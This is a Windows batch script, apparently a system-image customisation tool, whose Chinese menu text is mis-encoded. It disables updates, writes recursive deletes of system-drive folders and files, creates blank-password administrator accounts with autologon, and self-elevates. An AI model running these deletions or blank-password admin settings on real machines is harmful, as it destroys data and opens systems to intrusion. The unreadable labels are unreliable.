echo.   ^|   [1] ����                                                             ^|
echo.   ^|                                                                        ^|
echo.   ^|   [2] ���ã�Ĭ�ϣ�                                                     ^|
echo.   ^|                                                                        ^|
echo.   ^|   [X] ����                                                             ^|
echo.   ^|                                                                        ^|
echo.   ^|________________________________________________________________________^|
echo.
choice /c:12X /n /m ^>^>^>^>^>^>^>������ѡ��: 
if errorlevel 3 goto :input12
if errorlevel 2 goto :StartUpdate
if errorlevel 1 goto :StopUpdate

:StopUpdate
cls
set "Item=����Windows���·���"
echo sc config wuauserv start= disabled > "!ScriptsLog!\Update.log"
echo sc stop wuauserv >> "!ScriptsLog!\Update.log"
if exist "!ScriptsLog!\Update.log" ( call :Log & call :Achiexe ) else ( call :Failure )
:StartUpdate
cls
set "Item=����Windows���·���"
if exist "!ScriptsLog!\Update.log" del /f /q "!ScriptsLog!\Update.log"
if not exist "!ScriptsLog!\Update.log" ( call :Log & call :Achiexe ) else ( call :Failure )

:input13
cls&mode con cols=80 lines=30&title �ر�Windows����
set "Item="
set "goto=input13"
echo.
echo.    _______________________________ �رշ��� _______________________________
echo.   ^|                               ----------                               ^|
echo.   ^|                                                                        ^|
echo.   ^|   ��������Թر�Windows�κη��������˽���β鿴���������밴 G...     ^|
echo.   ^|                                                                        ^|
echo.   ^|   ���������괦������Ҫ�رյķ������ƣ�Ȼ��س���һ��ֻ������һ��     ^|
echo.   ^|                                                                        ^|
echo.   ^|   �������ƣ�����رն�������������룬���������������������š� ^|
echo.   ^|                                                                        ^|
echo.   ^|   ���������� X Ȼ��س���                                              ^|
echo.   ^|                                                                        ^|
echo.
set "Serving="
set /p Serving=^>^>^>^>^>^>^>�����룺
if not defined Serving cls && echo. && echo.��������"!Serving!"Ϊ�գ��밴���������... && pause>nul && goto :input13
set "Serving=!Serving:"=!"
if not defined Serving cls&&echo.&&echo.��������"!Serving!"��ʽ����ȷ���밴�����������������... && pause>nul&&goto :input13
if /i "!Serving!" equ "g" ( start http://cmdpe.com/post/9.html & goto :input13 )
if /i "!Serving!" equ "x" goto :menu3
if /i "!Serving: =!" equ "" cls && echo. && echo.��������Ϊ�գ��밴���������... && pause>nul && goto :input13
set "Item=�ر�"!Serving!"����"
echo net stop !Serving! >> "!ScriptsLog!\Serving.log"
if exist "!ScriptsLog!\Serving.log" ( call :Log & call :Achiexe ) else ( call :Failure )

:input14
cls&mode con cols=80 lines=30&title �����Զ�����
set "Item=�����Զ�����"
set "goto=menu3"
echo.
echo.    _____________________________ �����Զ����� _____________________________
echo.   ^|                             --------------                             ^|
echo.   ^|                                                                        ^|
echo.   ^|   ��ʹ��Setup.exe��װϵͳʱ��C�̾ɵ��ļ��ᱻ�������ɵ�ϵͳ�ᱻ�����   ^|
echo.   ^|                                                                        ^|
echo.   ^|   Windows.old������Զ�����󣬵�ϵͳ��װ���ʱ��C�����оɵ��ļ�����   ^|
echo.   ^|                                                                        ^|
echo.   ^|   ���ж��ᱻ�Զ���������Windows.old��                                ^|
echo.   ^|                                                                        ^|
echo.   ^|   [1] �����Զ�����                                                     ^|
echo.   ^|                                                                        ^|
echo.   ^|   [X] ����                                                             ^|
echo.   ^|                                                                        ^|
echo.   ^|________________________________________________________________________^|
echo.
choice /c:1X /n /m ^>^>^>^>^>^>^>������ѡ��: 
if errorlevel 2 goto :menu3
if errorlevel 1 goto :Autoclean

:Autoclean
cls
echo PerfLogs>"Mount\Windows\Temp\keep.txt"
echo Program Files>>"Mount\Windows\Temp\keep.txt"
if /i "!Bit!"=="64" echo Program Files ^(x86^)>>"Mount\Windows\Temp\keep.txt"
echo ProgramData>>"Mount\Windows\Temp\keep.txt"
echo Users>>"Mount\Windows\Temp\keep.txt"
echo Windows>>"Mount\Windows\Temp\keep.txt"
echo EFI>>"Mount\Windows\Temp\keep.txt"
echo BootCamp>>"Mount\Windows\Temp\keep.txt"
echo bootcamp>>"Mount\Windows\Temp\keep.txt"
echo for /f "eol=: delims=" %%%%i in ^('dir %%SystemDrive%%\ /b /ad-s^^^|findstr /vxilg:"%%WinDir%%\Temp\keep.txt"'^) do ^(rd /s /q "%%SystemDrive%%\%%%%i"^) > "!ScriptsLog!\Autoclean.log"
echo del /F /Q /A-S "%%SystemDrive%%\*.*" >> "!ScriptsLog!\Autoclean.log"
if exist "!ScriptsLog!\Autoclean.log" ( call :Log & call :Achiexe ) else ( call :Failure )

:input15
cls&mode con cols=80 lines=30&title ���ƻ�������Ż�
set "Item="
set "goto=input15"
echo.
echo.    ___________________________ ���ƻ�������Ż� ___________________________
echo.   ^|                           ------------------                           ^|
echo.   ^|                                                                        ^|
echo.   ^|   �������Ŀ��ֻ����ϵͳ��װ��ƻ������ʱ�Ż���Ч����װ��PC��Ч��       ^|
echo.   ^|                                                                        ^|
echo.   ^|   ѡ��[1]:��ϵͳ��װ��ƻ������ʱ���״ν��������Զ�����������ƻ��ר   ^|
echo.   ^|                                                                        ^|
echo.   ^|   �õ�BootCamp�����������ܲã��������飬��������������Զ��������     ^|
echo.   ^|                                                                        ^|
echo.   ^|   ѡ��[2]:�״ν�������������½�����Ϊztm.txt���ı������ı���д����Ҫ  ^|
echo.   ^|                                                                        ^|
echo.   ^|   �����������������С��Ȼ�󱣴��ı����ɴ�����Ӧ��������ƻ��ϵͳ��Ӱ   ^|
echo.   ^|                                                                        ^|
echo.   ^|   �죬����鿴�����밴 G ...                                           ^|
echo.   ^|                                                                        ^|
echo.   ^|   [1] �Զ���������װBootCamp����                                       ^|
echo.   ^|                                                                        ^|
echo.   ^|   [2] ƻ������ɵ��ʽ���������                                         ^|
echo.   ^|                                                                        ^|
echo.   ^|   [X] ����                                                             ^|
echo.   ^|                                                                        ^|
echo.   ^|________________________________________________________________________^|
echo.
choice /c:12GX /n /m ^>^>^>^>^>^>^>������ѡ��: 
if errorlevel 4 goto :menu3
if errorlevel 3 ( start www.cmdpe.com & goto :input15 )
if errorlevel 2 goto :AppleVhd
if errorlevel 1 goto :BootCmp

:BootCmp
REM Reg add "HKLM\ZTM\Classes\Installer\Products\6B6EFFCF8EABE094880D90A7D91A4CD3" /v "ProductName" /t REG_SZ /d "Boot Camp ����" /f >nul 2>nul
cls&title �Զ���������װBootCamp����
set "Item=�Զ���������װBootCamp����"
copy /v /y "File\BootCamp\BootCamp.exe" "!Scripts!\BootCamp.exe" >nul 2>nul
echo if exist %%windir%%\Driver rd /s /q %%windir%%\Driver > "!ScriptsLog!\StartBootCamp.log"
echo if exist "%%SystemDrive%%\BootCamp\BootCamp\Drivers\Apple\BootCamp.msi" set "BootCamp=%%SystemDrive%%\BootCamp\BootCamp" ^&^& goto :BootCamp >> "!ScriptsLog!\StartBootCamp.log"
echo if exist "%%Windir%%\BootCamp\BootCamp\Drivers\Apple\BootCamp.msi" set "BootCamp=%%Windir%%\BootCamp\BootCamp" ^&^& goto :BootCamp  >> "!ScriptsLog!\StartBootCamp.log"
echo for %%%%a in ^(C D E F G H I J K L M N O P Q R S T U V W X Y Z^) do if exist "%%%%a:\BootCamp\Drivers\Apple\BootCamp.msi" set "BootCamp=%%%%a:\BootCamp" ^&^& goto :BootCamp >> "!ScriptsLog!\StartBootCamp.log"
echo if not defined BootCamp goto :NoBootCamp >> "!ScriptsLog!\StartBootCamp.log"
echo :BootCamp  >> "!ScriptsLog!\StartBootCamp.log"
echo copy /v /y "%%~dp0BootCamp.exe" "%%BootCamp%%\Bootcamp.exe"  >> "!ScriptsLog!\StartBootCamp.log"
echo echo start "" "%%BootCamp%%\Bootcamp.exe"^^^&exit /b ^> "%%Windir%%\BootCamp.cmd" >> "!ScriptsLog!\StartBootCamp.log"
echo :NoBootCamp  >> "!ScriptsLog!\StartBootCamp.log"
if exist "!ScriptsLog!\StartBootCamp.log" ( call :Log & call :Achiexe ) else ( call :Failure )


REM echo if exist "%%SystemDrive%%\BootCamp\BootCamp\Drivers\Apple\BootCamp.msi" set "BootCamp=%%SystemDrive%%\BootCamp\BootCamp\Setup.exe" ^&^& "%%SystemDrive%%\BootCamp\BootCamp\Drivers\Apple\BootCamp.msi" /quiet /norestart ^&^& goto :BootCamp >> "%ScriptsLog%\StartBootCamp.log"
REM echo if exist "%%Windir%%\BootCamp\BootCamp\Drivers\Apple\BootCamp.msi" set "BootCamp=%%SystemDrive%%\BootCamp\BootCamp\Setup.exe" ^&^& "%%Windir%%\BootCamp\BootCamp\Drivers\Apple\BootCamp.msi" /quiet /norestart ^&^& goto :BootCamp  >> "%ScriptsLog%\StartBootCamp.log"
REM echo for %%%%a in ^(C D E F G H I J K L M N O P Q R S T U V W X Y Z^) do if exist "%%%%a:\BootCamp\Drivers\Apple\BootCamp.msi" set "BootCamp=%%%%a\BootCamp\BootCamp\Setup.exe" ^&^&" %%%%a:\BootCamp\Drivers\Apple\BootCamp.msi" /quiet /norestart ^&^& goto :BootCamp >> "%ScriptsLog%\StartBootCamp.log"
REM echo if not defined BootCamp goto :NoBootCamp >> "%ScriptsLog%\StartBootCamp.log"


REM echo if exist "%%SystemDrive%%\BootCamp\BootCamp\Drivers\Apple\BootCamp.msi" set "BootCamp=%%SystemDrive%%\BootCamp\BootCamp\Setup.exe" ^&^& goto :BootCamp >> "%ScriptsLog%\StartBootCamp.log"
REM echo if exist "%%Windir%%\BootCamp\BootCamp\Drivers\Apple\BootCamp.msi" set "BootCamp=%%SystemDrive%%\BootCamp\BootCamp\Setup.exe" ^&^& goto :BootCamp  >> "%ScriptsLog%\StartBootCamp.log"
REM echo for %%%%a in ^(C D E F G H I J K L M N O P Q R S T U V W X Y Z^) do if exist "%%%%a:\BootCamp\Drivers\Apple\BootCamp.msi" set "BootCamp=%%%%a\BootCamp\BootCamp\Setup.exe" ^&^& goto :BootCamp >> "%ScriptsLog%\StartBootCamp.log"
REM echo if not defined BootCamp goto :NoBootCamp >> "%ScriptsLog%\StartBootCamp.log"
REM echo :BootCamp >> "%ScriptsLog%\StartBootCamp.log"
REM echo echo Dim WshShell ^> "%%Windir%%\BootCamp.vbs" >> "%ScriptsLog%\StartBootCamp.log"
REM echo echo Set WshShell=WScript.CreateObject^("WScript.Shell"^) ^>^> "%%Windir%%\BootCamp.vbs" >> "%ScriptsLog%\StartBootCamp.log"
REM echo echo WshShell.Run "%%BootCamp%%" ^>^> "%%Windir%%\BootCamp.vbs" >> "%ScriptsLog%\StartBootCamp.log"
REM echo echo WScript.Sleep 200 ^>^> "%%Windir%%\BootCamp.vbs" >> "%ScriptsLog%\StartBootCamp.log"
REM echo echo WshShell.SendKeys "p" ^>^> "%%Windir%%\BootCamp.vbs" >> "%ScriptsLog%\StartBootCamp.log"
REM echo echo CreateObject^("Scripting.filesystemobject"^).DeleteFile ^(WScript.ScriptFullName^) ^>^> "%%Windir%%\BootCamp.vbs" >> "%ScriptsLog%\StartBootCamp.log"
REM echo :NoBootCamp  >> "%ScriptsLog%\StartBootCamp.log"
REM if exist "!ScriptsLog!\StartBootCamp.log" ( call :Log & call :Achiexe ) else ( call :Failure )

:AppleVhd
cls&title ƻ������ɵ��ʽ��������� 
set "Item=����ƻ������ɵ��ʽ���������"
set "AppleVHD=Mount\Windows\Apple.cmd"
echo @echo off^&setlocal EnableDelayedExpansion > "!AppleVHD!"
echo :begin >> "!AppleVHD!"
echo Find /i "go" "%%USERPROFILE%%\Desktop\ZTM.txt"^>nul 2^>nul ^&^& goto :size ^|^| ^(ping -n 8 127.0.0.1^>nul^&^&goto :begin ^) >> "!AppleVHD!"
echo set /a index=0 >> "!AppleVHD!"
echo set /a diskindex=0 >> "!AppleVHD!"

echo :size >> "!AppleVHD!"
echo set /a index+=1 >> "!AppleVHD!"
echo set "size=" >> "!AppleVHD!"
echo for /f "usebackq tokens=%%index%% delims= " %%%%i in ^("%%USERPROFILE%%\Desktop\ZTM.txt"^) do ^(set /a size=%%%%i^) >> "!AppleVHD!"
echo if /i %%size%% gtr 0 ^( goto :disk ^) else ^( goto :end ^) >> "!AppleVHD!"

echo :disk >> "!AppleVHD!"
echo set /a diskindex+=1 >> "!AppleVHD!"
echo set "Disk=" >> "!AppleVHD!"
echo for /f "tokens=%%diskindex%% delims= " %%%%i in ^("D E F G H I J K L M N O P Q R S T U V W X Y Z"^) do ^(fsutil fsinfo drives^|find /i "%%%%i:\"^>nul ^|^| set "Disk=%%%%i"^) >> "!AppleVHD!"
echo if not defined Disk goto :disk >> "!AppleVHD!"

echo :next >> "!AppleVHD!"
echo if not exist %%windir%%\VHD md %%windir%%\VHD^>nul >> "!AppleVHD!"
echo set /a vhdsize=^(%%size%%-1^)*4+1024*%%size%% >> "!AppleVHD!"
echo cmd /c "echo create vdisk file=%%windir%%\VHD\%%Disk%%.vhdx maximum=%%vhdsize%% type=expandable & echo attach vdisk & echo create partition primary & echo format quick label=%%Disk%% & echo assign letter=%%Disk%% & echo exit"^|diskpart.exe >> "!AppleVHD!"
echo echo select vdisk file=%%windir%%\VHD\%%Disk%%.vhdx^>^>%%windir%%\VHD\muont_vhd.txt >> "!AppleVHD!"
echo echo attach vdisk^>^>%%windir%%\VHD\muont_vhd.txt >> "!AppleVHD!"
echo echo �˴���Ϊ������̣����豸�ݱ����̣��뱸��%%windir%%\VHD\%%Disk%%.vhdx����ȡ���������ݣ�����Windows���̹�����أ����߸��ӣ�%%windir%%\VHD\%%Disk%%.vhdx���ɡ�^> %%Disk%%:\ʹ�ñض�.txt >> "!AppleVHD!"
echo echo.^>^>%%Disk%%:\ʹ�ñض�.txt >> "!AppleVHD!"
echo echo �����������Զ����أ������������ϵ�"�޸��Զ������������.cmd"���ɡ�^>^>%%Disk%%:\ʹ�ñض�.txt >> "!AppleVHD!"
echo echo @echo off^^^&schtasks /create /tn "�Զ������������" /tr "diskpart.exe /s '%%windir%%\VHD\muont_vhd.txt'" /sc ONLOGON /ru SYSTEM /f^^^>nul^^^&cls^^^&echo.^^^&echo.�޸��Զ��������������ɣ��밴������˳�...^^^&pause^^^>nul^^^&exit^>%%USERPROFILE%%\Desktop\�޸��Զ������������.cmd >> "!AppleVHD!"
echo schtasks /create /tn "�Զ������������" /tr "diskpart.exe /s '%%windir%%\VHD\muont_vhd.txt'" /sc ONLOGON /ru SYSTEM /f >> "!AppleVHD!"
echo goto :size >> "!AppleVHD!"
echo :end >> "!AppleVHD!"
echo del /f /q "%%USERPROFILE%%\Desktop\ZTM.txt" >> "!AppleVHD!"
echo rd /s /q %%windir%%\Sysprep >> "!AppleVHD!"
echo del /f /q %%0 >> "!AppleVHD!"
if exist "Mount\Windows\Apple.cmd" ( call :Log & call :Achiexe ) else ( call :Failure )

:input16
cls&mode con cols=80 lines=30&title ��������ֵ���Զ���װ
set "Unattend=Mount\Windows\Panther\Unattend.xml"
set "Item="
set "goto=menu3"
echo.
echo.    _________________________ ��������ֵ���Զ���װ _________________________
echo.   ^|                         ----------------------                         ^|
echo.   ^|                                                                        ^|
echo.   ^|   [1] �Զ�����User�û������������Ա�û��飨����Ϊ�գ�                 ^|
echo.   ^|                                                                        ^|
echo.   ^|   [2] �����ù���ԱAdministrator�û���¼ ������Ϊ�գ�                   ^|
echo.   ^|                                                                        ^|
echo.   ^|   [3] �Զ����û������������Ա�û��� ������Ϊ�գ�                      ^|
echo.   ^|                                                                        ^|
echo.   ^|   [X] ����                                                             ^|
echo.   ^|                                                                        ^|
echo.   ^|________________________________________________________________________^|
echo.
choice /c:123X /n /m ^>^>^>^>^>^>^>������ѡ��: 
if errorlevel 4 goto :menu3
if errorlevel 3 goto :InputUser
if errorlevel 2 goto :Administrator
if errorlevel 1 goto :User

:User
set "Item=��������ֵ���Զ���װ-�Զ�����User�û������������Ա�û��飨����Ϊ�գ�"
md "Mount\Windows\Panther" >nul 2>nul
echo ^<?xml version="1.0" encoding="utf-8"?^> > "!Unattend!"
echo ^<unattend xmlns="urn:schemas-microsoft-com:unattend"^> >> "!Unattend!"
echo     ^<settings pass="oobeSystem"^> >> "!Unattend!"
echo         ^<component name="Microsoft-Windows-Shell-Setup" processorArchitecture="amd64" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" xmlns:wcm="http://schemas.microsoft.com/WMIConfig/2002/State" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"^> >> "!Unattend!"
echo 			^<OOBE^> >> "!Unattend!"
echo 				^<SkipMachineOOBE^>true^</SkipMachineOOBE^> >> "!Unattend!"
echo 				^<SkipUserOOBE^>true^</SkipUserOOBE^> >> "!Unattend!"
echo 			^</OOBE^> >> "!Unattend!"			 
echo 			^<AutoLogon^> >> "!Unattend!"
echo                 ^<Username^>User^</Username^> >> "!Unattend!"
echo                 ^<Enabled^>true^</Enabled^> >> "!Unattend!"
echo                 ^<LogonCount^>1^</LogonCount^> >> "!Unattend!"
echo 				^<Password^>^<Value^>^</Value^>^</Password^> >> "!Unattend!"
echo            ^</AutoLogon^> >> "!Unattend!"			
echo 			^<UserAccounts^> >> "!Unattend!"
echo 				^<LocalAccounts^> >> "!Unattend!"
echo 					^<LocalAccount wcm:action="add"^> >> "!Unattend!"
echo                         ^<Name^>User^</Name^> >> "!Unattend!"
echo                         ^<Group^>administrators^</Group^> >> "!Unattend!"
echo                         ^<DisplayName^>User^</DisplayName^> >> "!Unattend!"
echo                         ^<Password^>^<Value^>^</Value^>^</Password^> >> "!Unattend!"
echo                     ^</LocalAccount^> >> "!Unattend!"
echo 				^</LocalAccounts^> >> "!Unattend!"
echo 			^</UserAccounts^> >> "!Unattend!"		
echo         ^</component^> >> "!Unattend!"
echo         ^<component name="Microsoft-Windows-Shell-Setup" processorArchitecture="X86" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" xmlns:wcm="http://schemas.microsoft.com/WMIConfig/2002/State" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"^> >> "!Unattend!"           
echo 			^<OOBE^> >> "!Unattend!"
echo 				^<SkipMachineOOBE^>true^</SkipMachineOOBE^> >> "!Unattend!"
echo 				^<SkipUserOOBE^>true^</SkipUserOOBE^> >> "!Unattend!"
echo 			^</OOBE^> >> "!Unattend!"			 
echo 			^<AutoLogon^> >> "!Unattend!"
echo                 ^<Username^>User^</Username^> >> "!Unattend!"
echo                 ^<Enabled^>true^</Enabled^> >> "!Unattend!"
echo                 ^<LogonCount^>1^</LogonCount^> >> "!Unattend!"
echo 				^<Password^>^<Value^>^</Value^>^</Password^> >> "!Unattend!"
echo            ^</AutoLogon^>	>> "!Unattend!"		
echo 			^<UserAccounts^> >> "!Unattend!"
echo 				^<LocalAccounts^> >> "!Unattend!"
echo 					^<LocalAccount wcm:action="add"^> >> "!Unattend!"
echo                         ^<Name^>User^</Name^> >> "!Unattend!"
echo                         ^<Group^>administrators^</Group^> >> "!Unattend!"
echo                         ^<DisplayName^>User^</DisplayName^> >> "!Unattend!"
echo                         ^<Password^>^<Value^>^</Value^>^</Password^> >> "!Unattend!"
echo                     ^</LocalAccount^> >> "!Unattend!"
echo 				^</LocalAccounts^> >> "!Unattend!"
echo 			^</UserAccounts^> >> "!Unattend!"			
echo         ^</component^> >> "!Unattend!"
echo     ^</settings^> >> "!Unattend!"
echo ^</unattend^> >> "!Unattend!"
echo Net ACCOUNTS /MAXPWAGE:UNLIMITED > "!ScriptsLog!\password.log"
if exist "!Unattend!" ( call :Log & call :Achiexe ) else ( call :Failure )

:Administrator
cls
set "Item=��������ֵ���Զ���װ-�����ù���ԱAdministrator�û���¼ ������Ϊ�գ�"
md "Mount\Windows\Panther" >nul 2>nul
echo ^<?xml version="1.0" encoding="utf-8"?^> > "!Unattend!"
echo ^<unattend xmlns="urn:schemas-microsoft-com:unattend"^> >> "!Unattend!"
echo     ^<settings pass="oobeSystem"^> >> "!Unattend!"
echo         ^<component name="Microsoft-Windows-Shell-Setup" processorArchitecture="amd64" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" xmlns:wcm="http://schemas.microsoft.com/WMIConfig/2002/State" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"^> >> "!Unattend!"
echo 			^<OOBE^> >> "!Unattend!"
echo 				^<SkipMachineOOBE^>true^</SkipMachineOOBE^> >> "!Unattend!"
echo 				^<SkipUserOOBE^>true^</SkipUserOOBE^> >> "!Unattend!"
echo 			^</OOBE^> >> "!Unattend!"			 
echo     		^<AutoLogon^> >> "!Unattend!"
echo                 ^<Username^>Administrator^</Username^> >> "!Unattend!"
echo                 ^<Enabled^>true^</Enabled^> >> "!Unattend!"
echo                 ^<LogonCount^>1^</LogonCount^> >> "!Unattend!"
echo            ^</AutoLogon^> >> "!Unattend!"
echo            ^<LogonCommands^> >> "!Unattend!"
echo                 ^<AsynchronousCommand wcm:action="add"^> >> "!Unattend!"
echo                     ^<Description^>Active^</Description^> >> "!Unattend!"
echo                     ^<Order^>1^</Order^> >> "!Unattend!"
echo                 ^</AsynchronousCommand^> >> "!Unattend!"
echo            ^</LogonCommands^> >> "!Unattend!"	
echo         ^</component^> >> "!Unattend!"
echo         ^<component name="Microsoft-Windows-Shell-Setup" processorArchitecture="X86" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" xmlns:wcm="http://schemas.microsoft.com/WMIConfig/2002/State" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"^> >> "!Unattend!"           
echo 			^<OOBE^> >> "!Unattend!"
echo 				^<SkipMachineOOBE^>true^</SkipMachineOOBE^> >> "!Unattend!"
echo 				^<SkipUserOOBE^>true^</SkipUserOOBE^> >> "!Unattend!"
echo 			^</OOBE^> >> "!Unattend!"			 
echo     		^<AutoLogon^> >> "!Unattend!"
echo                 ^<Username^>Administrator^</Username^> >> "!Unattend!"
echo                 ^<Enabled^>true^</Enabled^> >> "!Unattend!"
echo                 ^<LogonCount^>1^</LogonCount^> >> "!Unattend!"
echo            ^</AutoLogon^> >> "!Unattend!"
echo            ^<LogonCommands^> >> "!Unattend!"
echo                 ^<AsynchronousCommand wcm:action="add"^> >> "!Unattend!"
echo                     ^<Description^>Active^</Description^> >> "!Unattend!"
echo                     ^<Order^>1^</Order^> >> "!Unattend!"
echo                 ^</AsynchronousCommand^> >> "!Unattend!"
echo            ^</LogonCommands^> >> "!Unattend!"			
echo         ^</component^> >> "!Unattend!"
echo     ^</settings^> >> "!Unattend!"
echo ^</unattend^> >> "!Unattend!"
echo Net ACCOUNTS /MAXPWAGE:UNLIMITED > "!ScriptsLog!\password.log"
if exist "!Unattend!" ( call :Log & call :Achiexe ) else ( call :Failure )

:InputUser
cls&echo.
echo.    ____________________________ �Զ����û��� ______________________________
echo.   ^|                            --------------                              ^|
echo.   ^|                                                                        ^|
echo.   ^|   �������й�괦�����Զ����û���Ȼ��س������������������������š� ^|
echo.   ^|                                                                        ^|
echo.   ^|   ���践������ X Ȼ��س���                                            ^|
echo.   ^|                                                                        ^|
echo.
set "User="
set /p User=^>^>^>^>^>^>^>�����룺
if not defined User cls && echo. && echo.��������Ϊ�գ��밴�����������������... && pause>nul && goto :InputUser
set "User=!User:"=!"
if not defined User cls && echo. && echo.���������ʽ����ȷ���밴�����������������... && pause>nul && goto :InputUser
if /i "!User: =!" equ "" cls && echo. && echo.��������Ϊ�գ��밴�����������������... && pause>nul && goto :InputUser
if /i "!User:.=!" equ "" cls && echo. && echo.���������ʽ����ȷ���밴�����������������... && pause>nul && goto :InputUser
if /i "!User!" equ "x" goto :input16
set "Item=��������ֵ���Զ���װ-�Զ�����"!User!"�û������������Ա�û��飨����Ϊ�գ�"
if /i "!User: =!" neq "!User!" cls && echo. && echo.��������"!User!"�пո��û����������пո��밴�����������������... && pause>nul && goto :InputUser
md "Mount\Windows\Panther" >nul 2>nul
echo ^<?xml version="1.0" encoding="utf-8"?^> > "!Unattend!"
echo ^<unattend xmlns="urn:schemas-microsoft-com:unattend"^> >> "!Unattend!"
echo     ^<settings pass="oobeSystem"^> >> "!Unattend!"
echo         ^<component name="Microsoft-Windows-Shell-Setup" processorArchitecture="amd64" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" xmlns:wcm="http://schemas.microsoft.com/WMIConfig/2002/State" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"^> >> "!Unattend!"
echo 			^<OOBE^> >> "!Unattend!"
echo 				^<SkipMachineOOBE^>true^</SkipMachineOOBE^> >> "!Unattend!"
echo 				^<SkipUserOOBE^>true^</SkipUserOOBE^> >> "!Unattend!"
echo 			^</OOBE^> >> "!Unattend!"			 
echo 			^<AutoLogon^> >> "!Unattend!"
echo                 ^<Username^>!User!^</Username^> >> "!Unattend!"
echo                 ^<Enabled^>true^</Enabled^> >> "!Unattend!"
echo                 ^<LogonCount^>1^</LogonCount^> >> "!Unattend!"
echo 				^<Password^>^<Value^>^</Value^>^</Password^> >> "!Unattend!"
echo            ^</AutoLogon^> >> "!Unattend!"			
echo 			^<UserAccounts^> >> "!Unattend!"
echo 				^<LocalAccounts^> >> "!Unattend!"
echo 					^<LocalAccount wcm:action="add"^> >> "!Unattend!"
echo                         ^<Name^>!User!^</Name^> >> "!Unattend!"
echo                         ^<Group^>administrators^</Group^> >> "!Unattend!"
echo                         ^<DisplayName^>!User!^</DisplayName^> >> "!Unattend!"
echo                         ^<Password^>^<Value^>^</Value^>^</Password^> >> "!Unattend!"
echo                     ^</LocalAccount^> >> "!Unattend!"
echo 				^</LocalAccounts^> >> "!Unattend!"
echo 			^</UserAccounts^> >> "!Unattend!"		
echo         ^</component^> >> "!Unattend!"
echo         ^<component name="Microsoft-Windows-Shell-Setup" processorArchitecture="X86" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" xmlns:wcm="http://schemas.microsoft.com/WMIConfig/2002/State" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"^> >> "!Unattend!"           
echo 			^<OOBE^> >> "!Unattend!"
echo 				^<SkipMachineOOBE^>true^</SkipMachineOOBE^> >> "!Unattend!"
echo 				^<SkipUserOOBE^>true^</SkipUserOOBE^> >> "!Unattend!"
echo 			^</OOBE^> >> "!Unattend!"			 
echo 			^<AutoLogon^> >> "!Unattend!"
echo                 ^<Username^>!User!^</Username^> >> "!Unattend!"
echo                 ^<Enabled^>true^</Enabled^> >> "!Unattend!"
echo                 ^<LogonCount^>1^</LogonCount^> >> "!Unattend!"
echo 				^<Password^>^<Value^>^</Value^>^</Password^> >> "!Unattend!"
echo            ^</AutoLogon^>	>> "!Unattend!"		
echo 			^<UserAccounts^> >> "!Unattend!"
echo 				^<LocalAccounts^> >> "!Unattend!"
echo 					^<LocalAccount wcm:action="add"^> >> "!Unattend!"
echo                         ^<Name^>!User!^</Name^> >> "!Unattend!"
echo                         ^<Group^>administrators^</Group^> >> "!Unattend!"
echo                         ^<DisplayName^>!User!^</DisplayName^> >> "!Unattend!"
echo                         ^<Password^>^<Value^>^</Value^>^</Password^> >> "!Unattend!"
echo                     ^</LocalAccount^> >> "!Unattend!"
echo 				^</LocalAccounts^> >> "!Unattend!"
echo 			^</UserAccounts^> >> "!Unattend!"			
echo         ^</component^> >> "!Unattend!"
echo     ^</settings^> >> "!Unattend!"
echo ^</unattend^> >> "!Unattend!"
echo Net ACCOUNTS /MAXPWAGE:UNLIMITED > "!ScriptsLog!\password.log"
if exist "!Unattend!" ( call :Log & call :Achiexe ) else ( call :Failure )

:xitongyouhua
cls&mode con cols=80 lines=30&title Windows ϵͳ�Ż�
set "Item="
set "goto=xitongyouhua"
echo.
echo.    ___________________________ Windows ϵͳ�Ż� ___________________________
echo.   ^|                           ------------------                           ^|
echo.   ^|   [1] Windows10 ��Ӳ�����׿Խ����                                     ^|
echo.   ^|                                                                        ^|
echo.   ^|   [2] ������еĿ���������                                             ^|
echo.   ^|                                                                        ^|
echo.   ^|   [3] Windows 10 �ر���ʾ�ͼ���                                        ^|
echo.   ^|                                                                        ^|
echo.   ^|   [4] ����/�ر��������� ^(�ر�����������ʹ���ļ���������ļ�����^)       ^|
echo.   ^|                                                                        ^|
echo.   ^|   [5] ����͸��Ч��                                                     ^|
echo.   ^|                                                                        ^|
echo.   ^|   [6] ���������Ƭ ^(��̬Ӳ�̲�������,������ʹ��רҵ�������^^!^)        ^|
echo.   ^|                                                                        ^|
echo.   ^|   [X] ����                                                             ^|
echo.   ^|                                                                        ^|
echo.   ^|________________________________________________________________________^|
echo.
choice /c:123456X /n /m ^>^>^>^>^>^>^>������ѡ��: 
if errorlevel 7 goto :menu1
if errorlevel 6 goto :CleanUpDiskDebris
if errorlevel 5 goto :DisableTransparency
if errorlevel 4 goto :SearchIndex
if errorlevel 3 goto :DisableTipsAndTechniques
if errorlevel 2 goto :DELBootItems
if errorlevel 1 goto :ExcellentPerformance

:ExcellentPerformance
set "params=%*"
cd /d "%~dp0" && ( if exist "%temp%\getadmin.vbs" del "%temp%\getadmin.vbs" ) && fsutil dirty query %systemdrive% 1>nul 2>nul || (  echo Set UAC = CreateObject^("Shell.Application"^) : UAC.ShellExecute "cmd.exe", "/k cd ""%~sdp0"" && %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs" && "%temp%\getadmin.vbs" && exit /B )
title=��Ӳ�����׿Խ���ܵ�Դ�ƻ�
powercfg /list | find "(׿Խ����)" > NUL
if %ERRORLEVEL% == 0 (
goto SetActive
) else (
goto DuplicateScheme
)

:DuplicateScheme
powercfg /DUPLICATESCHEME e9a42b02-d5df-448d-aa00-03f14749eb61 && echo ������ɡ� && goto SetActive

:SetActive
for /f "tokens=3,4" %%i in ('powercfg /list') do (
if "%%j" == "(׿Խ����)" powercfg /SETACTIVE %%i && echo ����ɹ���&&goto :Achiexe
)
:://-----------------------------------------------------------------------------------//::
:DELBootItems
del /f /q /s C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\*
echo.�����ļ����ڵ�����Ҫ�����������ļ���ɾ��
